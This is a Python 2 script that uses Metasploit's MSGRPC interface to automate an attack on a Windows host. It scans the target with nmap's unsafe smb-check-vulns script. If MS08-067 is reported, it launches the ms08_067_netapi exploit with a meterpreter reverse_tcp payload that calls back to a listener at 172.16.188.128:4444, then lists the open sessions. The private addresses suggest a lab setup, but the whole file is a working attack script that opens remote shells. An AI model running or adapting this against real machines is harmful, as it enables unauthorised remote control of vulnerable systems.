__author__ = 'dave'

import time

import MsfMsgrpc


def check_ms08_067(msf_msgrpc, consoleId, rhost):
    nmapCmd = "db_nmap --script=smb-check-vulns --script-args=unsafe=1 -p 139,445 " + rhost + "\n"

    print "[+] Checking if " + rhost + " is vulnerable to MS08-067 with nmap..."
    response = msf_msgrpc.consoleWrite(token, consoleId, nmapCmd)
    time.sleep(5)

    response = msf_msgrpc.consoleRead(token, consoleId)
    busy = response['busy']
    while busy is True:
        response = msf_msgrpc.consoleRead(token, consoleId)
        busy = response['busy']
        print "[+] Waiting for nmap to finish... "
        time.sleep(5)

    data = response['data'].split('\n')

    isVulnerable = False
    for line in data:
        if ("MS08-067" in line and "VULNERABLE" in line):
            isVulnerable = True

    return isVulnerable


host = "172.16.188.128"
port = 55552
username = "msf"
password = "pymsgrpc"

msf_msgrpc = MsfMsgrpc.MsfMsgrpc(host, port, username, password)
response = msf_msgrpc.login()
if response["result"] == "success":
    print "[+] Connected to MSGRPC successfully!"

token = response['token']

response = msf_msgrpc.createConsole(token)
consoleId = response["id"]

print "[+] Created Console with ID: " + str(consoleId)

response = msf_msgrpc.consoleRead(token, consoleId)

rhost = "172.16.188.129"

isVuln = check_ms08_067(msf_msgrpc, consoleId, rhost)

if (isVuln):
    print "[+] " + rhost + " is vulnerable to MS08-067!"
    ms08_067 = """use exploit/windows/smb/ms08_067_netapi
    set payload windows/meterpreter/reverse_tcp
    set rhost """ + rhost + """
    set lhost 172.16.188.128
    set lport 4444
    run
    """

    print "[+] Exploiting " + rhost + " ..."
    response = msf_msgrpc.consoleWrite(token, consoleId, ms08_067)
    time.sleep(5)

    response = msf_msgrpc.consoleRead(token, consoleId)
    print "first " + str(response)
    response = msf_msgrpc.consoleRead(token, consoleId)
    print "second " + str(response)

    busy = response['busy']
    while busy is True:
        response = msf_msgrpc.consoleRead(token, consoleId)
        busy = response['busy']
        print "[+] Waiting for exploit to finish... " + str(response)
        time.sleep(5)

    response = msf_msgrpc.consoleWrite(token, consoleId, "sessions")

    response = msf_msgrpc.consoleRead(token, consoleId)
    print "Console Read: " + str(response)

response = msf_msgrpc.destroyConsole(token, consoleId)
if response['result'] == "success":
    print "Console " + consoleId + " destroyed successfully"
